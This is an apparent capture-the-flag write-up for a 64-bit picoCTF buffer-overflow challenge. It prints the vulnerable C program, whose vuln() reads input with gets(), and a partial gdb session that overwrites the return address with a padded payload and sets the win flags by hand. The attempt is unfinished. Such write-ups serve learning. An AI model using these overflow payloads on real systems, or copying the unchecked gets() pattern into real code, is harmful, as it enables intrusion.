It is solvable with the same steps for [NewOverFlow1](https://github.com/alshaboti/CTFs/blob/master/picoCTF2019/NewOverFlow1-x64.MD),
as the flag function exists we can directly print the flag as we did in NewOverFlow1.

This challenge suppose to have no flag funciton, then we will have to print it through win_fun.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }


  

}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}

```

# Attempt1:
I tried to overwrite `win` and `win2` variables with `1` (i.e. true) then jump to `win_fun`, but for some reason it shows `'flag.txt' missing in the current directory!`

```
<get win_fn address>
$gdb vuln
(gdb) b vuln
(gdb) r
(gdb)disass win_fn
0x00000000004007bf

< break just after gets at vuln>
(gdb) disass vuln
0x00000000004008cb
(gbd) b *0x00000000004008cb
(gdb) r <<< python -c 'import struct; print("A"*72+struct.pack("<I",0x00000000004007bf) )'




<get win1 and win2 address then overwite them>
(gdb)p (int) win1
0
(gdb)info add win1
0x601079
(gdb)info add win2
0x60107a
(gdb) set {char}0x601079=1
(gdb) set {char}0x60107a=1



```
